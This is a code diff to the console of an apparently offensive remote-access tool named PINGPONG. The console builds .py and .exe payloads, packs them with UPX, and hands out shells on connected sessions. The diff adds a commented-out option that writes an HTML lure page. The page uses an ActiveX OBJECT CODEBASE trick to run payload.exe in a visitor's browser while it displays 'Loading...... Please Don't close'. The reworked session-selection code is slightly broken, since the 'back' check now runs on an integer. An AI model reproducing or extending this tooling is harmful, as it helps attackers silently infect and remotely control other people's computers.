@@ -5,7 +5,9 @@
 import handler
 import config_set
 import threading
+import os
 import sys
+import shutil
 #print的基本函数
 #PINPONG 攻击载荷文件夹：payload/PINGPONG_payload_file
 def print_error(str):
@@ -55,6 +57,7 @@ def sub_main():
                     print_normal('the format of the payload')
                     print_normal('1) .py')
                     print_normal('2) .exe')
+                    # print_normal('3) .html')
                     _format = input('payload>[*]choose your format>')
                     if _format == '1':
                         upx_dir = ' '
@@ -63,6 +66,28 @@ def sub_main():
                         upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
                         back_to_main(upx_dir)
                         payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
+#                     elif _format == '3':
+#                         upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
+#                         back_to_main(upx_dir)
+#                         payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe')
+#                         os.mkdir('./payload_html')
+#                         with open('./payload_html/index.html', 'w') as f:
+#                             f.write(''' 
+# <script language="javascript">
+# run_exe="<OBJECT ID=/"RUNIT/" WIDTH=0 HEIGHT=0 TYPE=/"application/x-oleobject/""
+# run_exe+="CODEBASE=/"payload.exe#version=1,1,1,1/">"
+# run_exe+="<PARAM NAME=/"_Version/" value=/"65536/">"
+# run_exe+="</OBJECT>"
+# run_exe+="<HTML><H1>Loading...... Please Don't close</H1></HTML>";
+# document.open();
+# document.clear();
+# document.writeln(run_exe);
+# document.close();
+# </script>
+# ''')
+#                         shutil.copy('./payload.exe', './payload_html/payload.exe') 
+#                         os.remove('./payload.exe')
+
                     main()
                 else:
                     print_error('[-]no such choice')
@@ -194,16 +219,13 @@ def sub_main():
                     print_normal(f'''
     {i}  {session[5]}  {session[1]} : {session[2]} ---> {session[3]} : {session[4]}         ''')
                 try:
-                    input_id = input("sessions>[*]type the id of the session(type 'back' for main console)>")
-                    back_to_main(input_id)
-                    int(input_id)
-                    if input_id > len(session_pool):
-                        print_error("sessions>[-]input error")
-                        back_to_sessions()
-                except:
+                    input_id = int(input("sessions>[*]type the id of the session(type 'back' for main console)>"))
+                    back_to_main(input_id, is_print=True)
+                    session = session_pool[input_id - 1]
+                except Exception as e:
+                    print(e)
                     print_error("sessions>[-]input error")
                     back_to_sessions()
-                session = session_pool[input_id - 1]
                 session[0].send(bytes('OK', 'utf8'))
                 if session[5] == 'PINGPONG session':
                     handler.PINGPONG_shell(session[0], session[1], session[2], session[3], session[4], False, '')
@@ -303,9 +325,12 @@ def get_all_keys():
     for key in _global_dict.keys():
         key_list.append(key)
     return key_list 
-def back_to_main(var):
+def back_to_main(var, is_print=False):
     if var == 'back' or var =='BACK':
-        sub_main()
+        if not is_print:
+            sub_main()
+        else:
+            main()
 if __name__ == "__main__":
     config_set.config_load()
     print_main()
